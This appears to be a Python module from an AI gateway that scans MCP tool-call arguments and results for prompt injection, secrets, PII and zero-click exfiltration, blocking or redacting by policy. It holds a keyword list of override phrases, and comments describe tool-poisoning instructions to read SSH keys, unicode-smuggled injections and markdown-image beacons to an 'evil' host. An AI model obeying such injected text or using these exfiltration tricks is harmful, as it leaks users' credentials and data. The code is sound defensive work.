"""MCP two-tier scan orchestrator (Tier-1 policy/presets → conditional Tier-2 Bedrock).

Emits a structured scan trace (Tier-1 + Tier-2 stages) and compliance tags for
SOC workflows. PII/secret detection is regex-based (``patterns`` module) plus the
optional Bedrock Tier-2 judge — there is no Presidio dependency.

Enforcement (``tag`` < ``redact`` < ``block``) is treated as a FLOOR: a ``block``
posture blocks on ANY finding regardless of the matching rule's authored action.
See :func:`_enforce_blocks`.
"""

from __future__ import annotations

import asyncio
import logging
import os
from dataclasses import dataclass, field
from typing import Any

from ai_mesh_shared.mcp_compliance_tags import tags_for_preset_or_entity

from mcp_scan_targets import _safe_json, extract_and_bind
from patterns import (
    _INFRA_NETWORK_KEYS,
    detect_credential_exposure,
    detect_ip_leakage,
    detect_pii,
    detect_secrets,
    get_compliance_tags,
    redact_all,
    redact_all_scoped,
)
from policy_engine import apply_field_redaction, apply_redaction, evaluate_mcp_policies, _normalize_key

LOG = logging.getLogger("gateway.mcp_scan")

_INJECTION_KEYWORDS = (
    "ignore previous instructions",
    "ignore all prior",
    "disregard your instructions",
    "system prompt",
    "jailbreak",
    "do anything now",
)


@dataclass
class McpFinding:
    entity_type: str
    score: float
    start: int
    end: int
    direction: str
    tier: str = "tier1"
    threat_type: str = ""
    detail: str = ""
    # CHG-0074: the concrete detector keys that matched (e.g. ["internal_ipv6",
    # "file_path_unix"]). Lets a downstream enforcement floor tell an
    # ENFORCEABLE network-infra leak (redactable) from a flag-tier file path
    # WITHOUT re-parsing ``detail`` — see mcp_proxy._findings_have_infra_network_leak.
    matched_kinds: list[str] = field(default_factory=list)

    def to_finding_dict(self) -> dict[str, Any]:
        return {
            "entity_type": self.entity_type,
            "score": round(self.score, 4),
            "start": self.start,
            "end": self.end,
            "direction": self.direction,
            "tier": self.tier,
            "threat_type": self.threat_type,
            "detail": self.detail,
            "matched_kinds": list(self.matched_kinds),
        }


@dataclass
class McpScanResult:
    findings: list[McpFinding] = field(default_factory=list)
    compliance_tags: list[str] = field(default_factory=list)
    blocked: bool = False
    # True when a tier had findings under a 'monitor' action (observe-only):
    # the call is allowed + audited as decision='monitor'. block/redact win over
    # monitor (block > redact > monitor), so this only drives the final decision
    # when nothing blocked or redacted.
    monitored: bool = False
    scan_trace: list[dict[str, Any]] = field(default_factory=list)
    # 3b: named response fields masked on the OUTPUT via per-policy RBAC field
    # redaction (redaction_fields). Empty unless a matched policy declared fields
    # AND the posture allowed mutation (not 'monitor'). Surfaced to the audit meta.
    redacted_fields: list[str] = field(default_factory=list)
    # 3b cross-stage: the field names DECLARED by policies matched in THIS scan
    # (both directions), independent of whether they were applied. The INPUT scan
    # surfaces these so the caller can project the same fields out of the RESPONSE
    # (control HTTP-path parity: an input-stage policy match strips output fields).
    policy_redaction_fields: list[str] = field(default_factory=list)

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)


def _get_input_scanner():
    """Return the live InputScanner from the running gateway app module.

    SAME defect class as ``_get_policy_sync`` (below): gunicorn loads
    ``ai_mesh_gateway.main:app`` and its startup handler sets ``INPUT_SCANNER`` on
    THAT module object; a bare ``import main`` can resolve to a *different* module
    object (same file, separate namespace) whose module-level ``INPUT_SCANNER`` stayed
    ``None`` — which silently disabled MCP **Tier-2** (``scan_prompt_with_tier2`` was
    never reached; the tier2 scan fell back to ``scanner_unavailable`` even when the
    operator enabled Tier-2). Resolve from ``sys.modules`` preferring the packaged
    module, mirroring ``_get_policy_sync``.
    """
    import sys

    for mod_name in ("ai_mesh_gateway.main", "main"):
        mod = sys.modules.get(mod_name)
        if mod is not None:
            scanner = getattr(mod, "INPUT_SCANNER", None)
            if scanner is not None:
                return scanner
    try:
        import ai_mesh_gateway.main as gateway_main

        return getattr(gateway_main, "INPUT_SCANNER", None)
    except Exception:
        try:
            import main as gateway_main  # noqa: WPS433 — legacy dev entry

            return getattr(gateway_main, "INPUT_SCANNER", None)
        except Exception:
            return None


def _get_policy_sync():
    """Return the live PolicySync singleton from the running gateway app module.

    Gunicorn loads ``ai_mesh_gateway.main:app``; a bare ``import main`` can resolve
    to a *different* module object (same file, separate namespace) whose
    ``POLICY_SYNC`` was never started — which silently disabled MCP policy eval.
    """
    import sys

    for mod_name in ("ai_mesh_gateway.main", "main"):
        mod = sys.modules.get(mod_name)
        if mod is not None:
            sync = getattr(mod, "POLICY_SYNC", None)
            if sync is not None:
                return sync
    try:
        import ai_mesh_gateway.main as gateway_main

        return getattr(gateway_main, "POLICY_SYNC", None)
    except Exception:
        try:
            import main as gateway_main  # noqa: WPS433 — legacy dev entry

            return getattr(gateway_main, "POLICY_SYNC", None)
        except Exception:
            return None


def _direction_label(scan_direction: str) -> str:
    return "inbound" if scan_direction == "input" else "outbound"


def _tags_for_finding(finding: McpFinding) -> list[str]:
    if finding.threat_type in ("pii", "secret", "ip_leakage"):
        return get_compliance_tags(
            finding.detail.replace("Matched: ", "").split(", ")
            if "Matched:" in finding.detail
            else [finding.entity_type]
        )
    preset_tags = tags_for_preset_or_entity(finding.entity_type)
    if preset_tags:
        return preset_tags
    return tags_for_preset_or_entity(finding.threat_type or "policy_match")


def _merge_tags(existing: list[str], new: list[str]) -> list[str]:
    out = list(existing)
    for t in new:
        if t not in out:
            out.append(t)
    return out


def _effective_control(effective: dict[str, Any], tier: str, scan_direction: str) -> dict[str, Any]:
    key = f"{tier}_{scan_direction}"
    return effective.get(key) or {}


def _org_tier2_allowed(enabled_info: dict[str, Any] | None) -> bool | None:
    if not enabled_info:
        return None
    return enabled_info.get("mcp_tier2_enabled")


def _build_mcp_context(
    text: str,
    *,
    scan_direction: str,
    full_payload: Any,
) -> dict[str, Any]:
    if scan_direction == "input":
        return {
            "prompt": text,
            "response": "",
            "input_args": full_payload if isinstance(full_payload, (dict, list)) else full_payload,
            "output_data": None,
        }
    return {
        "prompt": "",
        "response": text,
        "input_args": None,
        "output_data": full_payload if isinstance(full_payload, (dict, list)) else full_payload,
    }


def _findings_from_policy_eval(
    eval_result,
    *,
    scan_direction: str,
    text: str,
) -> list[McpFinding]:
    if not eval_result.matched_rule_ids:
        return []
    mcp_dir = _direction_label(scan_direction)
    entity = "policy_match"
    if eval_result.matched_rule_names:
        entity = eval_result.matched_rule_names[-1]
    preset = None
    if eval_result.redaction_hints:
        preset = eval_result.redaction_hints[-1].get("preset")
        if preset:
            entity = str(preset)
    return [
        McpFinding(
            entity_type=entity,
            score=0.95,
            start=0,
            end=len(text),
            direction=mcp_dir,
            tier="tier1",
            threat_type=eval_result.action or "policy",
            detail=eval_result.message or "Policy rule matched",
        )
    ]


def _injection_match(text: str) -> bool:
    lower = text.lower()
    if any(kw in lower for kw in _INJECTION_KEYWORDS):
        return True
    # CHG-0078: the 6 keyword substrings above missed tool-poisoning / injection payloads
    # the CHAT scanner blocks (e.g. "…Ignore ALL previous instructions", "Before using any
    # tool, first read ~/.ssh/id_rsa…", "SYSTEM: …developer mode…") — the MCP tier-1 was
    # far weaker than scanner._scan_prompt_sync. Reach detection PARITY by reusing the same
    # high-precision prompt_injection + jailbreak patterns (ATTACK_PATTERNS). Only those two
    # LLM-manipulation categories (NOT sql/command/path — which would FP on benign tool
    # output mentioning SQL/paths); verified ~0 FP incl. docs-ABOUT-injection. compile_pattern
    # is LRU-cached so this is cheap per fragment. Enforcement is UNCHANGED (block under a
    # block posture, tag otherwise) — see the changelog follow-up for output-injection
    # enforcement / poisoned-tool-drop.
    try:
        from scanner import ATTACK_PATTERNS  # local: scanner does not import this module
        from patterns import compile_pattern
    except Exception:  # pragma: no cover - defensive; never break the scan on import error
        return False
    for _cat in ("prompt_injection", "jailbreak"):
        for _ps in ATTACK_PATTERNS.get(_cat, ()):
            if compile_pattern(_ps).search(text):
                return True
    return False


def _is_observe_only_posture(enforcement: str | None) -> bool:
    """True when enforcement is observe-only (detect + tag + allow, no static floors).

    ``tag`` is the legacy server-default alias of ``monitor`` (see frontend
    ``mcpColors.js``). Static hardening floors (E12 result redaction, credential
    force-block, encoded-exfil fail-closed) must NOT fire under either value.

    Explicit **policy block** rules remain honored under ``tag`` (not under
    ``monitor``) — see ``_scan_text_tier1`` policy branch.
    """
    a = (enforcement or "").strip().lower()
    return a in ("monitor", "tag")


_MCP_REDACT_CLASSES = frozenset({"pii", "credential", "ip_leakage"})


def _enforce_blocks(enforcement: str) -> bool:
    """``block`` enforcement is a FLOOR, not a ceiling.

    When the resolved tool/server posture is ``block``, ANY matched finding
    blocks the call regardless of the matching rule's *authored* action — e.g.
    a PII policy rule authored as ``redact`` still BLOCKS under a ``block``
    posture. This is the single source of truth consulted by every Tier-1 and
    Tier-2 branch so the policy-rule path can never diverge from the
    injection/PII/secret paths. That divergence (block gated on the rule's own
    action) was the A4 outbound-block defect: a ``redact``-authored rule under a
    ``block`` posture silently redacted instead of blocking.
    """
    return enforcement == "block"


def _mcp_policy_only_enforcement(enabled_info: dict[str, Any] | None = None) -> bool:
    """PHASE 3 (collapse-to-one-surface): when True the MCP scan RETIRES the server posture /
    scan-control ACTION as an enforcement input — presets and Tier-2 run OBSERVE-ONLY and the
    seeded policy RULES (their own action) are the sole enforcer. This is exactly the
    ``enforcement="tag"`` world the pre-cutover diff-gate proved reproduces the posture verdict
    byte-for-byte, so flipping it loses no coverage FOR AN ORG WHOSE DETECTOR POLICIES ARE SEEDED
    (Phase 2b). It is OFF by default: activate only after seeding, per-org via
    ``enabled_info['mcp_policy_only_enforcement']`` (preferred — lets an operator cut over one
    seeded org at a time) or gateway-wide via the ``MCP_POLICY_ONLY_ENFORCEMENT`` env kill-switch.
    The scan-control ENABLED/direction/scope and Tier-2 enable gating are UNCHANGED — only the
    ACTION is dropped."""
    if enabled_info and "mcp_policy_only_enforcement" in enabled_info:
        return _coerce_flag(enabled_info.get("mcp_policy_only_enforcement"))
    return _MCP_POLICY_ONLY_ENFORCEMENT_ENV


def _coerce_flag(value: Any) -> bool:
    """Strict truthiness for the cutover flag. A bare ``bool()`` treated ANY non-empty string as
    True — so a stringly-typed config value of ``'false'``/``'0'``/``'off'``/``'no'`` would silently
    ACTIVATE the cutover (fail-open), the opposite of the env parser. Match the env parser exactly:
    only real truthy values (or the canonical truthy strings) activate; everything else is False."""
    if isinstance(value, str):
        return value.strip().lower() in ("1", "true", "yes", "on")
    return bool(value)


_MCP_POLICY_ONLY_ENFORCEMENT_ENV = os.environ.get("MCP_POLICY_ONLY_ENFORCEMENT", "").strip().lower() in (
    "1", "true", "yes", "on",
)


def _resolve_tier_action(ctrl: dict[str, Any] | None, fallback: str) -> str:
    """Resolve the enforcement action for a single tier from its control row.

    Each tier's MCPScanControl row owns its action INDEPENDENTLY (monitor /
    redact / block). ``inherit`` (or an unset action) defers to the resolved
    server/tool ``scan_action`` passed as ``fallback`` — preserving prior
    behaviour for rows that don't opt into a per-tier override.

    Semantics applied by the scan functions: ``block`` blocks on any finding
    (floor); ``redact`` masks; ``monitor`` (and the legacy ``tag`` fallback)
    detect + tag + allow without mutating. Precedence across a request is
    block > redact > monitor, and a Tier-1 block short-circuits Tier-2.
    """
    a = ((ctrl or {}).get("action") or "inherit").strip()
    if a in ("inherit", ""):
        return fallback or "monitor"
    return a


def _neutralize_render_leaks(text: str) -> str:
    """CHG-0099: full chat-output-guard parity — neutralize every RENDER-TIME
    reconstruction leak in a single leaf, in the same order as
    ``output_guard.sanitize_output_for_verdict``:
      1. ``neutralize_exfil_channels`` — zero-click auto-render exfil beacons (runs FIRST
         so it sees the raw URL, before any masking hides the payload);
      2. ``neutralize_encoded_pii`` — HTML-entity / percent-encoded runs that DECODE to a
         PII/secret;
      3. ``neutralize_markdown_split_pii`` — a PII/secret whose chars are interleaved with
         inline markdown emphasis / code / HTML markers (``1**2**3-45-6789`` renders as an
         SSN) — the CHG-0096 MCP gap (only #1 was wired, so a markdown-split PII/secret in
         a tool RESULT evaded the raw regexes yet a markdown client reconstructed it).
    Each is a STRICT no-op on benign markdown/URLs."""
    from output_guard import (  # local: avoid import cycle
        neutralize_encoded_pii,
        neutralize_exfil_channels,
        neutralize_markdown_split_pii,
    )
    return neutralize_markdown_split_pii(neutralize_encoded_pii(neutralize_exfil_channels(text)))


# CHG-0114: cap the recursive walk depth in _neutralize_exfil_deep. CPython's
# ``json.loads`` C scanner parses very deeply-nested JSON that the Python-level walk
# below then cannot traverse (default recursion limit ~1000) — so an untrusted MCP
# result nested a few thousand deep RAISED RecursionError, which tier1 swallowed,
# SILENTLY SKIPPING render-leak neutralization for that result (a fail-open DoS on the
# exfil defense). Legit MCP result nesting is shallow; 200 is far beyond any real
# payload and well under the stack limit. Overridable for pathological legit servers.
_MAX_EXFIL_WALK_DEPTH = int(os.environ.get("MCP_EXFIL_WALK_MAX_DEPTH", "200"))


def _neutralize_exfil_deep(text: str) -> str:
    """CHG-0097/0099: render-leak neutralization that is robust to JSON serialization.

    The MCP tier-1 scan target is usually the WHOLE result payload JSON-serialized
    (``target_mode="entire"``), so HTML attribute quotes are escaped (``src=\\"...\\"``)
    and the HTML/srcset regexes (which expect real quotes) miss them — the CHG-0096
    residual. If ``text`` is a JSON structure, parse it and neutralize each UNESCAPED
    string leaf (via ``_neutralize_render_leaks`` — exfil beacons + encoded-PII +
    markdown-split PII, CHG-0099), then re-serialize — so HTML/SVG/CSS beacons AND
    markdown-split PII nested in a field are handled too. Non-JSON text (a plain-string
    result) is neutralized directly. Returns the ORIGINAL text unchanged when nothing was
    neutralized (no reformatting churn, so a benign result stays byte-identical).

    CHG-0114: the per-leaf walk is DEPTH-BOUNDED and the walk + re-serialize are
    fail-safe (RecursionError / any error → string-level neutralize), so a deeply-nested
    untrusted result cannot exhaust the Python stack and cannot silently disable the
    render-leak defense."""
    stripped = text.lstrip()
    if stripped[:1] not in ("{", "["):
        return _neutralize_render_leaks(text)
    import json as _json
    try:
        obj = _json.loads(text)
    except Exception:
        return _neutralize_render_leaks(text)
    changed = [False]

    def _walk(o, _depth=0):
        # CHG-0114: cap recursion — beyond the depth an adversarial payload cannot
        # exhaust the stack; a render-time beacon nested this deep cannot reconstruct
        # client-side anyway, and the whole serialized text is still tier1-scanned.
        if _depth >= _MAX_EXFIL_WALK_DEPTH:
            return o
        if isinstance(o, str):
            n = _neutralize_render_leaks(o)
            if n != o:
                changed[0] = True
            return n
        if isinstance(o, list):
            return [_walk(x, _depth + 1) for x in o]
        if isinstance(o, dict):
            return {k: _walk(v, _depth + 1) for k, v in o.items()}
        return o

    try:
        obj = _walk(obj)
        return _json.dumps(obj) if changed[0] else text
    except Exception:
        # Never raise into the scan: a very deep (past-cap) obj can still trip
        # json.dumps recursion — fall back to string-level neutralization.
        return _neutralize_render_leaks(text)


def _scan_text_tier1_sync(
    text: str,
    *,
    scan_direction: str,
    enforcement: str,
    full_payload: Any,
    org_slug: str,
    server_slug: str,
    tool_name: str,
    actor: dict[str, Any] | None = None,
    include_policies: bool = True,
    include_presets: bool = True,
) -> tuple[str, list[McpFinding], bool, list[str]]:
    """Run Tier-1 policy + preset evaluation on a single text fragment.

    Returns ``(mutated_text, findings, blocked, redaction_fields)`` where
    ``redaction_fields`` (3b) are the named response fields the matched policy
    declared for RBAC masking — surfaced so ``scan_mcp_payload`` can mask them on
    the structured OUTPUT payload (the injection/PII fallbacks declare none).

    PHASE 1 — POLICY OWNS ITS SCOPE (2026-07-23). ``include_policies`` /
    ``include_presets`` let ``scan_mcp_payload`` run the two Tier-1 lanes as
    SEPARATE passes so each honours its OWN operator-selected scope:

      * POLICY pass  (include_policies=True, include_presets=False) — evaluated by
        ``scan_mcp_payload`` against the FULL payload, so a policy authored
        ``scope=entire`` is honoured on the whole payload and its redaction lands
        where the POLICY matched — no longer silently narrowed to the scan-control
        Tier-1 ``target_mode``/``key_path`` binding (the detect-wide/mutate-narrow
        raw-egress leak: a secret in a field OUTSIDE a key-scoped scan-control was
        neither detected, tagged, redacted, nor blocked despite a matching
        entire-scope redact policy).
      * PRESET pass  (include_policies=False, include_presets=True) — run per
        scan-control-bound target, so the PRESET scanners keep the operator's
        scan-control scope.

    The default (both True) is the ORIGINAL combined behaviour — policy match
    short-circuits the presets — kept intact for every existing direct caller/test.
    """
    if not text:
        return text, [], False, []

    findings: list[McpFinding] = []
    blocked = False
    mutated = text
    mcp_dir = _direction_label(scan_direction)
    policy_rfields: list[str] = []

    if include_policies:
        context = _build_mcp_context(text, scan_direction=scan_direction, full_payload=full_payload)
        policy_sync = _get_policy_sync()
        policies: list[dict[str, Any]] = []
        if policy_sync is not None and org_slug and server_slug:
            try:
                policies = policy_sync.get_policies_for_server(org_slug, server_slug, domain="mcp")
            except Exception as exc:
                LOG.warning("MCP policy bundle lookup failed: %s", exc)

        if policies:
            eval_result = evaluate_mcp_policies(
                policies, context, tool_name=tool_name or None, actor=actor
            )
            if eval_result.matched_rule_ids:
                findings.extend(
                    _findings_from_policy_eval(eval_result, scan_direction=scan_direction, text=text)
                )
                policy_redacts = eval_result.action == "redact"
                # A matched rule authored action='block' is an EXPLICIT block intent —
                # honor it even under a coarser posture (tag/redact), matching the
                # control-plane engine (engine.py blocks on ``result.action == "block"``)
                # and the backend HTTP path. Without this, the stdio/websocket adapter
                # path — which bypasses the backend that would re-enforce the rule —
                # silently downgrades an actor-scoped block rule to detect-and-tag
                # under the default 'tag' posture (BACKSTOP_FINDINGS G2 item 3, #3).
                # A 'monitor' posture is an explicit observe-only override and wins.
                policy_blocks = eval_result.action == "block"
                if _enforce_blocks(enforcement) or (
                    policy_blocks and not (enforcement or "").strip().lower() == "monitor"
                ):
                    # A4 FIX: block posture is a FLOOR (blocks ANY matched rule, even
                    # one authored redact/tag); additionally a rule's own 'block'
                    # action is honored under any non-monitor posture (CHG-0007), including
                    # legacy ``tag``.
                    blocked = True
                elif policy_redacts and eval_result.redaction_hints and (
                    (enforcement or "").strip().lower() != "monitor"
                ):
                    # Policy-authored redact rules apply whenever they match — not only
                    # when the server/tool posture is explicitly ``redact``. Skipped under
                    # an explicit per-tier ``monitor`` posture (control-plane parity:
                    # MCPToolCallView skips input redaction when _input_action == monitor).
                    mutated = apply_redaction(text, eval_result.redaction_hints)
                policy_rfields = list(eval_result.redaction_fields)
                if include_presets:
                    # Combined mode (legacy default): a policy match short-circuits the
                    # presets — the policy governs this fragment.
                    return mutated, findings, blocked, policy_rfields

    if not include_presets:
        # Policy-only pass: return the policy verdict (or a clean pass when no rule
        # matched); the caller runs the PRESET pass separately on its own scope.
        return mutated, findings, blocked, policy_rfields

    # CHG-0079: deobfuscate INVISIBLE / CONFUSABLE unicode (zero-width, bidi-override,
    # homoglyph, unicode-tag block, combining-mark smuggling) before detection. The chat
    # scanner normalizes via _normalize_unicode before scanning, but the MCP tier-1
    # scanned RAW text — so a zero-width-broken ("I​g​n​o​r​e…") or homoglyph ("Ｉgnore…")
    # injection, or a similarly hidden secret / internal-IP (below), bypassed it. Only
    # NON-ASCII text can carry these characters, so pure-ASCII text (the common case)
    # skips the normalize cost entirely.
    if not text.isascii():
        from scanner import _normalize_unicode  # local: scanner doesn't import this module
        _deob = _normalize_unicode(text)
    else:
        _deob = text

    if _injection_match(text) or (_deob != text and _injection_match(_deob)):
        findings.append(
            McpFinding(
                entity_type="prompt_injection",
                score=0.9,
                start=0,
                end=len(text),
                direction=mcp_dir,
                tier="tier1",
                threat_type="prompt_injection",
                detail="Matched injection keyword pattern",
            )
        )
        if _enforce_blocks(enforcement):
            blocked = True
        elif enforcement == "redact":
            mutated = redact_all(text)
        return mutated, findings, blocked, []

    pii = detect_pii(text)
    secrets = detect_secrets(text)
    # 1.4 "PII/IP/regulated": extend MCP tagging to IP/infrastructure leakage
    # (internal IPs, internal hostnames, internal URLs, private file paths). These
    # patterns + detect_ip_leakage already existed and ran on the chat output_guard
    # path, but the MCP tool-call scan only ran detect_pii/detect_secrets — so an
    # internal host/path in a tool RESULT was never detected/tagged/redacted.
    ip_leak = detect_ip_leakage(text)
    # CHG-0075: also run detect_credential_exposure. CREDENTIAL_EXPOSURE_PATTERNS is a
    # SEPARATE dict (bearer_token, connection_string w/ password, jwt, stripe_key,
    # twilio_api_key, azure_storage_key, gcp_service_account_key, slack_token,
    # github_fine_grained_pat) NOT read by detect_secrets. redact_all masks it, but the
    # MCP tier-1 scan only ran detect_pii/secrets/ip_leak — so a credential whose ONLY
    # match is a CREDENTIAL_EXPOSURE kind (e.g. a Stripe/Twilio/Azure key or a DB
    # connection string's password) was never DETECTED, so it drove no enforcement and
    # egressed RAW on a tool RESULT (and passed unblocked in tool ARGS to an untrusted
    # upstream). Same wrong-dict class as CHG-0071. Folded into the secret bucket.
    cred_exp = detect_credential_exposure(text)
    if pii or secrets or ip_leak or cred_exp:
        kinds = (
            list(pii.keys()) + list(secrets.keys())
            + list(ip_leak.keys()) + list(cred_exp.keys())
        )
        # threat precedence: pii > secret/credential > ip_leakage (a credential
        # exposure is a "secret" for _findings_have_secret_or_pii / _findings_have_
        # credential, so it drives the redact floor AND the arg credential force-block).
        threat = (
            "pii" if pii
            else ("secret" if (secrets or cred_exp) else "ip_leakage")
        )
        findings.append(
            McpFinding(
                entity_type=kinds[0] if kinds else "PII",
                score=0.85,
                start=0,
                end=len(text),
                direction=mcp_dir,
                tier="tier1",
                threat_type=threat,
                detail=f"Matched: {', '.join(kinds)}",
                matched_kinds=kinds,  # CHG-0074: enables the network-infra redact floor
            )
        )
        if _enforce_blocks(enforcement):
            blocked = True
        elif enforcement == "redact":
            # TWO-LAYER STRICT OPERATOR CONTROL (2026-07-22): redact means redact —
            # MASK (never block, never forward raw). This used to byte-verify the scrub
            # and ESCALATE redact -> block when a detected value survived (e.g. a file
            # path). Scoped-all masks EVERY detectable class INCLUDING file paths
            # (round-1/4 scoped file-path masking), so the value the byte-verify used to
            # block on is now masked in place and forwarded — the operator chose redact,
            # not block.
            mutated = redact_all_scoped(text, _MCP_REDACT_CLASSES)

    # CHG-0076: obfuscation-bypass parity with the chat output scanner (G33/G35).
    # detect_secrets folds base64/hex transport, but a SECRET / CREDENTIAL / INTERNAL
    # NETWORK IP hidden by a TEXT-encoding (HTML char refs &#..;, percent-encoding,
    # \u / \x escapes) dodges the raw regexes above — yet a markdown/HTML MCP client
    # decodes it back to the value, so a malicious upstream can exfil a stolen
    # credential / internal IP past the firewall (or a tenant can smuggle one in ARGS).
    # redact_all CANNOT mask an ENCODED run, so BLOCK (fail-closed) — mirroring the chat
    # INPUT path (scanner._scan_prompt_sync) and the byte-verify block above; a 'monitor'
    # posture stays observe-only. SCOPED to secret/credential/internal-NETWORK-IP (no
    # legit reason to text-encode those); generic PII is EXCLUDED so a scraped HTML page's
    # entity-encoded contact email does not false-block a legitimate web/HTML tool result.
    # OPERATOR SOVEREIGNTY, IMPLEMENTED FAITHFULLY (a3714946 follow-up) — same shape as
    # the render-leak gate below. a3714946 promises "under tag/monitor the scan still
    # DETECTS, TAGS and EMITS FINDINGS; only MUTATION and BLOCKING are withheld", but this
    # gate wrapped ``findings.append`` too, so an HTML-entity- or zero-width-encoded
    # secret produced NO finding under the default posture. Detect always; withhold only
    # the BLOCK. tag/monitor still never block — the decision is unchanged.
    if not blocked:
        _encoded_observe_only = _is_observe_only_posture(enforcement)
        from scanner import _decode_text_encoding_variants  # local: avoid import cycle
        _variants = list(_decode_text_encoding_variants(text))
        # CHG-0079: also probe the INVISIBLE/CONFUSABLE-unicode-deobfuscated view
        # (zero-width / bidi / homoglyph / unicode-tag smuggling) — a secret / internal
        # IP hidden that way dodges the raw regexes but the model reads it deobfuscated.
        if _deob != text:
            _variants.append(_deob)
        # PIPELINE-0011: collect kinds detectable in the TRULY RAW text (no
        # canonicalization) so the encoded-exfil check only fires on kinds
        # genuinely REVEALED by decoding/deobfuscation, not plain-text kinds.
        # ALL four detect_* functions internally canonicalize (strip ZWC, fold
        # fullwidth), so a ZWC-hidden credential appears in the detect_* result
        # even though it's really obfuscated — use the _*_core variants (no
        # canon) for the filter.
        from patterns import (  # local: no cycle
            _detect_pii_core, _detect_secrets_core,
            _detect_ip_leakage_core, _detect_credential_exposure_core,
        )
        _raw_detected_kinds: set[str] = set()
        _raw_detected_kinds.update(_detect_pii_core(text).keys())
        _raw_detected_kinds.update(_detect_secrets_core(text).keys())
        _raw_detected_kinds.update(_detect_ip_leakage_core(text).keys())
        _raw_detected_kinds.update(_detect_credential_exposure_core(text).keys())
        for _variant in _variants:
            if _variant == text:
                continue
            _hidden: dict[str, str] = {}
            _hidden.update(detect_secrets(_variant))
            _hidden.update(detect_credential_exposure(_variant))
            _hidden.update({
                k: v for k, v in detect_ip_leakage(_variant).items()
                if k in _INFRA_NETWORK_KEYS
            })
            # CHG-0083: several CREDENTIALS live in PII_PATTERNS (detect_pii), not
            # SECRET_PATTERNS — aws_access_key (AKIA/ASIA), aws_secret_access_key,
            # api_key_openai, github_token, private_key_header. detect_secrets misses
            # them, so an OBFUSCATED AWS key (HTML-entity / zero-width / homoglyph) slipped
            # past the encoded-exfil block above while its raw form masks. Include decoded
            # detect_pii matches whose compliance tag is SECRET (credentials misfiled as
            # PII) — NOT generic PII (email/phone/ssn/cc: tags GDPR/PII/HIPAA/PCI-DSS, never
            # SECRET), which stays excluded to avoid FP on entity-encoded scraped-HTML PII.
            _hidden.update({
                k: v for k, v in detect_pii(_variant).items()
                if "SECRET" in get_compliance_tags([k])
            })
            # PIPELINE-0011: filter out kinds already detected in plain text.
            _hidden = {k: v for k, v in _hidden.items()
                       if k not in _raw_detected_kinds}
            if _hidden:
                findings.append(
                    McpFinding(
                        entity_type=next(iter(_hidden)),
                        score=0.9,
                        start=0,
                        end=len(text),
                        direction=mcp_dir,
                        tier="tier1",
                        threat_type="secret",
                        detail=(
                            # Honest per posture (see the render-leak twin below).
                            f"Encoded exfil (text-encoding) hides: {', '.join(_hidden)}"
                            + ("" if not _encoded_observe_only else
                               " — NOT blocked: this organization's scan action is "
                               "observe-only")
                        ),
                        matched_kinds=list(_hidden),
                    )
                )
                # redact means redact: mask the encoded run best-effort (redact_all
                # masks the transport/text-encoded forms — see patterns._redact_obfuscated)
                # and FORWARD. Only ``block`` withholds. (2026-07-22: was block under
                # redact OR block — an escalation the operator did not select.)
                if _enforce_blocks(enforcement):
                    blocked = True
                elif enforcement == "redact":
                    mutated = redact_all_scoped(text, _MCP_REDACT_CLASSES)
                break

    # CHG-0096: defang zero-click auto-render EXFIL BEACONS in the tool RESULT — parity
    # with the chat output guard (G40-G43). A malicious upstream tool result can embed a
    # markdown-image ``![x](https://evil/?d=<data>)``, an HTML ``<img src=...>`` / srcset,
    # or a protocol-relative beacon that a markdown/HTML MCP client AUTO-FETCHES on render
    # — a zero-click exfil of arbitrary data the text regexes never recognise as a secret
    # (so nothing above detected/masked it, yet the raw beacon egressed). This egress
    # BYPASSES the chat output guard (a distinct API surface). ``neutralize_exfil_channels``
    # masks the smuggled payload + strips the auto-render (image -> plain link); it is a
    # STRICT no-op on benign markdown/URLs (gated by ``_url_smuggles_data``), so it is safe
    # to run unconditionally under any enforcing posture. Applied to ``mutated`` so it
    # composes on top of any PII/secret redaction above; a 'monitor' posture stays
    # observe-only (matches the encoded-exfil block's gate).
    # OPERATOR SOVEREIGNTY, IMPLEMENTED FAITHFULLY (a3714946 follow-up): that commit
    # states the contract as "under tag/monitor the scan still DETECTS, TAGS and EMITS
    # FINDINGS; only MUTATION and BLOCKING are withheld". The gate below withheld
    # DETECTION too — it wrapped ``findings.append`` as well as the mutation — so under
    # the default ``tag`` posture a zero-click exfil beacon produced NO finding, NO tag
    # and nothing in the audit trail. The operator could not see the risk they had
    # chosen to observe rather than block, which makes "Tag only" indistinguishable
    # from "off". Detection now always runs; only the MUTATION honours the posture.
    # This does not re-open the decision — tag/monitor still never mutate.
    if not blocked:
        _observe_only = _is_observe_only_posture(enforcement)
        # Run on the RAW text (not the already-redacted ``mutated``): the beacon's
        # smuggled payload must be VISIBLE for ``_url_smuggles_data`` to trip — if
        # redact_all masked the URL's PII first, the neutralizer would see a masked tail
        # and leave the auto-render intact. If a beacon is defanged, RE-APPLY the
        # PII/secret redaction over the defanged text (when any was detected) so both the
        # beacon AND any other sensitive value are masked. CHG-0097: ``_neutralize_exfil_deep``
        # is JSON-aware so HTML/SVG/CSS/srcset beacons nested in a JSON payload (whose
        # attribute quotes are escaped) are defanged too, not just markdown/bare-URL.
        _neu = _neutralize_exfil_deep(text)
        if _neu != text:
            findings.append(
                McpFinding(
                    entity_type="render_reconstruction",
                    score=0.9,
                    start=0,
                    end=len(text),
                    direction=mcp_dir,
                    tier="tier1",
                    threat_type="exfil",
                    detail=(
                        # Honest per posture: under observe-only nothing was
                        # neutralized, so claiming otherwise would misreport the
                        # operator's own selection back to them.
                        ("Detected a render-time reconstruction leak (zero-click exfil "
                         "beacon / encoded-PII / markdown-split PII-secret) — NOT "
                         "neutralized: this organization's scan action is observe-only")
                        if _observe_only else
                        ("Neutralized a render-time reconstruction leak (zero-click exfil "
                         "beacon / encoded-PII / markdown-split PII-secret)")
                    ),
                )
            )
            if not _observe_only:
                mutated = redact_all(_neu) if (pii or secrets or ip_leak or cred_exp) else _neu
    return mutated, findings, blocked, []


# CHG-0103: the Tier-1 scan (detect_* + redact_all + the render-leak neutralizers, all
# SYNCHRONOUS regex over the text) ran inline on the event loop. A LARGE tool result
# (up to the 10MB response cap) took seconds of pure CPU and BLOCKED the loop — freezing
# EVERY other concurrent request on that worker (measured: an 8MB scan stalled a trivial
# coroutine ~9.8s). Offload the scan to a worker thread for large inputs so the loop stays
# responsive (the ``re`` loop releases the GIL between patterns; the same 8MB scan then
# stalls the loop only ~0.16s). Small results (the common case) run INLINE — the scan is
# sub-millisecond and offloading would only add thread-pool pressure under peak load.
